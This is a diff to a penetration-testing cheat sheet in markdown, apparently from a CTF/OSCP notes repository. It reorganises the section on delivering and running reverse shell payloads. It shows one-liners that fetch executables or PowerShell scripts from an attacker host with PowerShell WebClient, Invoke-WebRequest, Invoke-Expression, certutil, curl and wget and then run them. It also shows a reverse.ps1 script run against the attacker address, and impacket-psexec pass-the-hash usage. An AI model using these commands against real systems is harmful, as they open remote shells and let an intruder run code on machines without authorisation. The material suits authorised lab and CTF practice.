@@ -568,21 +568,6 @@ Examples: [digitalworld.local-bravery](https://github.com/joetanx/oscp/blob/main
 >
 > Add `-e x86/shikata_ga_nai -i 9` to use encoder (`-i 9` means 9 iterations, uses 1 iteration if `-i` is omitted)
 
-#### PowerShell-based reverse shell script:
-
-Download the reverse shell script:
-
-```sh
-curl -sLO https://github.com/joetanx/ctf/raw/main/reverse.ps1
-```
-
-Edit the address and port:
-
-```sh
-sed -i 's/<ADDRESS>/$KALI/' reverse.ps1
-sed -i 's/<PORT>/4444/' reverse.ps1
-```
-
 ### 4.4. Execute payloads
 
 #### Windows: Execute reverse shell TCP payload
@@ -593,8 +578,6 @@ sed -i 's/<PORT>/4444/' reverse.ps1
 |PowerShell<br>(System.Net.WebClient)|`powershell.exe -NoProfile -ExecutionPolicy Bypass -Command (New-Object System.Net.WebClient).DownloadFile('http://$KALI/reverse.exe','%TEMP%\reverse.exe'); Start-Process %TEMP%\reverse.exe`|
 |PowerShell<br>(Invoke-WebRequest)|`powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri http://$KALI/reverse.exe -OutFile .\reverse.exe; Start-Process %TEMP%\reverse.exe`|
 
-#### Windows: Execute PowerShell-based reverse shell script
-
 > [!Tip]
 >
 > `Invoke-Expression` is useful if you don't want the payload to touch the disk, but it works for Powershell Scripts only
@@ -603,7 +586,6 @@ sed -i 's/<PORT>/4444/' reverse.ps1
 >
 > ```cmd
 > powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://$KALI/reverse.ps1')
-> 
 > powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Invoke-Expression (Invoke-WebRequest -Uri http://$KALI/reverse.ps1')
 > ```
 
@@ -614,7 +596,35 @@ sed -i 's/<PORT>/4444/' reverse.ps1
 |cURL|`curl -O http://$KALI/reverse.elf && chmod +x reverse.elf && ./reverse.elf`|
 |Wget|`wget http://$KALI/reverse.elf && chmod +x reverse.elf && ./reverse.elf`|
 
-### 4.5. Windows direct connection
+### 4.5 Using the [reverse.ps1](/reverse.ps1) script in this repo
+
+Download to kali:
+
+```sh
+curl -sL --output-dir /var/www/html -O https://github.com/joetanx/ctf/raw/main/reverse.ps1
+```
+
+Download on target directly:
+
+```cmd
+certutil.exe /urlcache /f /split https://github.com/joetanx/ctf/raw/refs/heads/main/reverse.ps1
+```
+
+```cmd
+powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://github.com/joetanx/ctf/raw/refs/heads/main/reverse.ps1 -OutFile .\reverse.ps1
+```
+
+```cmd
+powershell.exe -NoProfile -ExecutionPolicy Bypass -Command (New-Object System.Net.WebClient).DownloadFile('https://github.com/joetanx/ctf/raw/refs/heads/main/reverse.ps1','.\reverse.ps1')
+```
+
+Run the script:
+
+```cmd
+.\reverse.ps1 $KALI $PORT
+```
+
+### 4.6. Windows direct connection
 
 #### evil-winrm
 
@@ -637,7 +647,7 @@ sed -i 's/<PORT>/4444/' reverse.ps1
 |Username/password|`impacket-psexec [$DOMAIN/]$USERNAME:$PASSWORD@$TARGET [$COMMAND]`|
 |Password hashes|`impacket-psexec -hashes $LM_HASH:$NT_HASH [$DOMAIN/]$USERNAME@$TARGET [$COMMAND]`|
 
-### 4.6. Upgrade to Full TTY
+### 4.7. Upgrade to Full TTY
 
 Certain activities like `su` will not run (error `su: must be run from a terminal`) without a terminal
 
